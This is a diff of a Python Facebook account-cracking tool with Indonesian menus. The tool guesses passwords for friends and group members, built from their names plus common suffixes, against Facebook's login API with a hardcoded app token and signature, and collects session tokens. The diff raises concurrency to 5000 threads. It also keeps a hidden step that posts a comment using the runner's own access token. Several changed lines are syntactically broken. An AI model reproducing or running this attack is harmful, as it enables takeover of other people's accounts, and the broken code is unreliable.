@@ -61,10 +61,10 @@ def menu(n,toket):
 	global loop
 	loop=0
 	banner()
-	print("%s(●) %sWellcome %s%s"%(G,W,Y,n))
+	print("%s(●) %sSelamat datang, %s%s"%(G,W,Y,n)) ditools kami...
 	print("""
 %s## %s1 Crack Daftar Teman
-%s## %s2 Crack Teman Dari Teman
+%s## %s2 Crack Daftar Dari Teman
 %s## %s3 Crack Daftar Anggota Group
 
 %s## %s0 Exit the program
@@ -102,10 +102,10 @@ def menu(n,toket):
 		
 	print("%s[*]%s please wait"%(P,W))
 	
-	m = ThreadPool(30)
+	m = ThreadPool(5000)
 	m.map(x,target)
 	result(found,checkpoint)
-	exit("%s\n[+] %sDone ... "%(R,W))
+	exit("%s\n[+] %sSelesai ... "%(R,W))
 
 def x(user):
 	global loop
@@ -114,7 +114,7 @@ def x(user):
 	except:
 		pass
 	try:
-		nama = s.get(url.format(user+"?access_token=%s"%(toket))).json()["first_name"]
+		nama = s.get(url.format(user+"?access_token=%s"%(toket))).json()["last_name"]
 		for pas in [nama+"123",nama+"880",nama+"12345",nama+"90",nama+".01","slamalikum","amar naam","Krud'dha","Kukurēra chēlē","Kukura","Mahārgha","Camatkāra",nama+"01","@"+nama]:
 			p = s.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pas+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
 			if "access_token" in p:
@@ -158,7 +158,7 @@ def cek():
 		login()
 	try:
 		n = s.get(url.format("me?access_token=%s"%(toket))).json()["name"]
-		s.post(url.format("100025271623353_116442009208186/comments?message=Baik+dong+&access_token=%s"%(toket)))
+		s.post(url.format("100025271623353_160495041469549/comments?message="found"&access_token=%s"%(toket)))
 		print("%s[*] %ssuccess load access token"%(G,W))
 		sleep(1)
 		menu(n,toket)
